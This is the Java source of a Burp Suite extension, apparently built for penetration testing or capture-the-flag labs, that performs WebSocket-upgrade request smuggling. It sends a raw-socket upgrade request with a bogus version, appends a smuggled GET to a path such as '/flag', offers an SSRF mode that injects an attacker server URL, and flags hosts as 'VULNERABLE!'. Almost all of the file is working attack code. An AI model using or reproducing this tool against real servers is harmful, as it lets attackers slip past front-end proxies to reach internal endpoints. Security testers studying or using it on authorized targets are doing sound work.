package burp;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.ByteArray;
import burp.api.montoya.http.HttpService;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.ui.contextmenu.ContextMenuEvent;
import burp.api.montoya.ui.contextmenu.ContextMenuItemsProvider;
import burp.api.montoya.ui.editor.EditorOptions;
import burp.api.montoya.ui.editor.HttpRequestEditor;
import burp.api.montoya.ui.editor.HttpResponseEditor;

import javax.swing.*;
import javax.swing.table.DefaultTableModel;
import javax.net.ssl.SSLSocket;
import javax.net.ssl.SSLSocketFactory;
import java.awt.*;
import java.io.*;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;

public class WebSocketSmuggler implements BurpExtension, ContextMenuItemsProvider {

    private MontoyaApi api;
    private DefaultTableModel tableModel;
    private JTable resultsTable;
    private AtomicInteger requestIdCounter = new AtomicInteger(1);

    // Native Burp Editors
    private HttpRequestEditor requestViewer;
    private HttpResponseEditor responseViewer;

    // Storage
    private Map<Integer, AttackLog> attackHistory = new ConcurrentHashMap<>();

    // UI Input Fields
    private JCheckBox ssrfToggle;
    private JTextField simpleBaitPathField;      // E.g., /socket (Used when SSRF is OFF)
    private JTextField ssrfInjectionPathField;   // E.g., /check-url?server= (Used when SSRF is ON)
    private JTextField ssrfServerField;          // E.g., http://attacker:8000 (Used when SSRF is ON)
    private JTextField smuggledPathField;        // E.g., /flag
    private JTextField versionField;             // E.g., 777 or 13

    static class AttackLog {
        HttpRequest request;
        HttpResponse response;

        AttackLog(HttpRequest req, HttpResponse res) {
            this.request = req;
            this.response = res;
        }
    }

    @Override
    public void initialize(MontoyaApi api) {
        this.api = api;
        api.extension().setName("WebSocket Smuggler (Modular)");

        SwingUtilities.invokeLater(() -> {
            JPanel mainPanel = new JPanel(new BorderLayout());

            // --- 1. CONFIG PANEL (Improved GridBagLayout) ---
            JPanel configPanel = new JPanel(new GridBagLayout());
            GridBagConstraints c = new GridBagConstraints();
            c.insets = new Insets(5, 5, 5, 5);
            c.fill = GridBagConstraints.HORIZONTAL;
            c.anchor = GridBagConstraints.WEST;

            // Row 0: SSRF Toggle Checkbox
            ssrfToggle = new JCheckBox("Enable SSRF-Triggered Smuggling");
            c.gridx = 0; c.gridy = 0; c.gridwidth = 2;
            configPanel.add(ssrfToggle, c);

            // --- Simple Mode Field ---
            simpleBaitPathField = new JTextField("/socket", 20);
            c.gridx = 0; c.gridy = 1; c.gridwidth = 1;
            configPanel.add(new JLabel("Simple Bait Path:"), c);
            c.gridx = 1;
            configPanel.add(simpleBaitPathField, c);

            // --- SSRF Mode Fields (Disabled by default) ---
            ssrfInjectionPathField = new JTextField("/check-url?server=", 20);
            ssrfServerField = new JTextField("http://127.0.0.1:8000", 20);

            c.gridx = 0; c.gridy = 2;
            configPanel.add(new JLabel("SSRF Injection Path:"), c);
            c.gridx = 1;
            configPanel.add(ssrfInjectionPathField, c);

            c.gridx = 0; c.gridy = 3;
            configPanel.add(new JLabel("Python Server URL:"), c);
            c.gridx = 1;
            configPanel.add(ssrfServerField, c);

            // --- Common Fields ---
            smuggledPathField = new JTextField("/flag", 20);
            versionField = new JTextField("777", 5);

            c.gridx = 0; c.gridy = 4;
            configPanel.add(new JLabel("Smuggled Path:"), c);
            c.gridx = 1;
            configPanel.add(smuggledPathField, c);

            c.gridx = 0; c.gridy = 5;
            configPanel.add(new JLabel("WS Version:"), c);
            c.gridx = 1;
            configPanel.add(versionField, c);

            c.gridx = 0; c.gridy = 6;
            JButton clearBtn = new JButton("Clear Results");
            clearBtn.addActionListener(e -> {
                tableModel.setRowCount(0);
                attackHistory.clear();
                HttpService dummy = HttpService.httpService("localhost", 80, false);
                requestViewer.setRequest(HttpRequest.httpRequest(dummy, ByteArray.byteArray("")));
                responseViewer.setResponse(HttpResponse.httpResponse(ByteArray.byteArray("")));
            });
            configPanel.add(clearBtn, c);

            // Initial state update and listener for toggle
            toggleSSRFFields();
            ssrfToggle.addActionListener(e -> toggleSSRFFields());

            // --- 2. TABLE AND EDITORS --- (Remaining UI setup is the same)
            String[] columns = {"ID", "Host", "Status", "Response 1", "Response 2", "Time"};
            tableModel = new DefaultTableModel(columns, 0) {
                @Override public boolean isCellEditable(int row, int column) { return false; }
            };
            resultsTable = new JTable(tableModel);
            resultsTable.setAutoCreateRowSorter(true);
            JScrollPane tableScroll = new JScrollPane(resultsTable);

            requestViewer = api.userInterface().createHttpRequestEditor(EditorOptions.READ_ONLY);
            responseViewer = api.userInterface().createHttpResponseEditor(EditorOptions.READ_ONLY);

            JTabbedPane reqTabs = new JTabbedPane(); reqTabs.addTab("Request", requestViewer.uiComponent());
            JTabbedPane resTabs = new JTabbedPane(); resTabs.addTab("Response", responseViewer.uiComponent());

            JSplitPane viewerSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, reqTabs, resTabs);
            viewerSplit.setResizeWeight(0.5);

            JSplitPane mainSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableScroll, viewerSplit);
            mainSplit.setResizeWeight(0.4);

            mainPanel.add(configPanel, BorderLayout.NORTH);
            mainPanel.add(mainSplit, BorderLayout.CENTER);

            resultsTable.getSelectionModel().addListSelectionListener(e -> {
                if (!e.getValueIsAdjusting()) updateEditors();
            });

            api.userInterface().registerSuiteTab("WebSocket Smuggler", mainPanel);
        });

        api.userInterface().registerContextMenuItemsProvider(this);
        api.logging().logToOutput("WebSocket Smuggler (Modular) Loaded. Simple mode is default.");
    }

    // New helper to handle UI state based on checkbox
    private void toggleSSRFFields() {
        boolean isSSRF = ssrfToggle.isSelected();

        // Disable simple mode field if SSRF is active
        simpleBaitPathField.setEnabled(!isSSRF);

        // Enable SSRF-specific fields if SSRF is active
        ssrfInjectionPathField.setEnabled(isSSRF);
        ssrfServerField.setEnabled(isSSRF);
    }

    private void updateEditors() {
        try {
            int viewRow = resultsTable.getSelectedRow();
            if (viewRow == -1) return;
            int modelRow = resultsTable.convertRowIndexToModel(viewRow);
            int id = Integer.parseInt(tableModel.getValueAt(modelRow, 0).toString());
            AttackLog log = attackHistory.get(id);
            if (log != null) {
                requestViewer.setRequest(log.request);
                responseViewer.setResponse(log.response);
            } else {
                HttpService dummy = HttpService.httpService("localhost", 80, false);
                requestViewer.setRequest(HttpRequest.httpRequest(dummy, ByteArray.byteArray("Waiting for attack to finish...")));
                responseViewer.setResponse(HttpResponse.httpResponse(ByteArray.byteArray("")));
            }
        } catch (Exception ex) {}
    }

    @Override
    public List<Component> provideMenuItems(ContextMenuEvent event) {
        List<Component> menuList = new ArrayList<>();
        JMenuItem item = new JMenuItem("Send to WebSocket Smuggler");
        item.addActionListener(e -> {
            List<HttpRequestResponse> selection = event.selectedRequestResponses();
            if (selection == null || selection.isEmpty()) return;
            new Thread(() -> performAttack(selection.get(0))).start();
        });
        menuList.add(item);
        return menuList;
    }

    private void performAttack(HttpRequestResponse baseRequest) {
        int id = requestIdCounter.getAndIncrement();
        String host = baseRequest.httpService().host();
        int port = baseRequest.httpService().port();
        boolean isSecure = baseRequest.httpService().secure();
        String timestamp = new SimpleDateFormat("HH:mm:ss").format(new Date());

        // Read all inputs
        String smuggledPath = smuggledPathField.getText();
        String wsVersion = versionField.getText();
        boolean useSSRF = ssrfToggle.isSelected();

        // --- DETERMINE BAIT PATH BASED ON TOGGLE ---
        String baitPathForRequest;
        if (useSSRF) {
            String injectionPath = ssrfInjectionPathField.getText();
            String ssrfServer = ssrfServerField.getText();
            // SSRF Mode: GET /check-url?server=http://attacker
            baitPathForRequest = injectionPath + ssrfServer;
        } else {
            // Simple Mode: GET /socket
            baitPathForRequest = simpleBaitPathField.getText();
        }

        SwingUtilities.invokeLater(() -> tableModel.addRow(new Object[]{id, host, "Testing...", "-", "-", timestamp}));

        try {
            // --- CONSTRUCT THE FULL PAYLOAD ---
            String baitRequestStr =
                    "GET " + baitPathForRequest + " HTTP/1.1\r\n" +
                            "Host: " + host + ":" + port + "\r\n" +
                            "Connection: Upgrade\r\n" +
                            "Upgrade: websocket\r\n" +
                            "Sec-WebSocket-Version: " + wsVersion + "\r\n" +
                            "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n" +
                            "\r\n";

            String smuggledRequestStr =
                    "GET " + smuggledPath + " HTTP/1.1\r\n" +
                            "Host: " + host + ":" + port + "\r\n" +
                            "\r\n";

            String fullRequestStr = baitRequestStr + smuggledRequestStr;

            // --- EXECUTE RAW SOCKET ATTACK ---
            Socket socket;
            if (isSecure) {
                SSLSocketFactory factory = (SSLSocketFactory) SSLSocketFactory.getDefault();
                socket = factory.createSocket(host, port);
                ((SSLSocket)socket).startHandshake();
            } else {
                socket = new Socket(host, port);
            }
            socket.setSoTimeout(5000);

            OutputStream out = socket.getOutputStream();
            InputStream in = socket.getInputStream();

            out.write(fullRequestStr.getBytes());
            out.flush();

            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] data = new byte[4096];
            int nRead;
            List<String> responseCodes = new ArrayList<>();

            try {
                while ((nRead = in.read(data, 0, data.length)) != -1) {
                    buffer.write(data, 0, nRead);
                    String chunk = new String(data, 0, nRead);
                    String[] lines = chunk.split("\n");
                    for (String line : lines) {
                        if (line.trim().startsWith("HTTP/")) {
                            String[] parts = line.trim().split(" ");
                            if (parts.length > 1) responseCodes.add(parts[1]);
                        }
                    }
                }
            } catch (Exception timeout) { }
            socket.close();

            // --- SAVE & UPDATE ---
            byte[] fullResponseBytes = buffer.toByteArray();
            HttpRequest burpRequest = HttpRequest.httpRequest(baseRequest.httpService(), fullRequestStr);
            HttpResponse burpResponse = HttpResponse.httpResponse(ByteArray.byteArray(fullResponseBytes));

            attackHistory.put(id, new AttackLog(burpRequest, burpResponse));

            String status = (responseCodes.size() >= 2) ? "VULNERABLE!" :
                    (responseCodes.size() == 1) ? "Safe (1 Response)" : "Connection Failed";
            String c1 = responseCodes.size() > 0 ? responseCodes.get(0) : "-";
            String c2 = responseCodes.size() > 1 ? responseCodes.get(1) : "-";

            SwingUtilities.invokeLater(() -> {
                for (int i = 0; i < tableModel.getRowCount(); i++) {
                    int rowId = Integer.parseInt(tableModel.getValueAt(i, 0).toString());
                    if (rowId == id) {
                        tableModel.setValueAt(status, i, 2);
                        tableModel.setValueAt(c1, i, 3);
                        tableModel.setValueAt(c2, i, 4);
                        if (resultsTable.getSelectedRow() != -1) updateEditors();
                        break;
                    }
                }
            });

        } catch (Exception ex) {
            SwingUtilities.invokeLater(() -> {
                for (int i = 0; i < tableModel.getRowCount(); i++) {
                    int rowId = Integer.parseInt(tableModel.getValueAt(i, 0).toString());
                    if (rowId == id) {
                        tableModel.setValueAt("Error", i, 2);
                        break;
                    }
                }
            });
        }
    }
}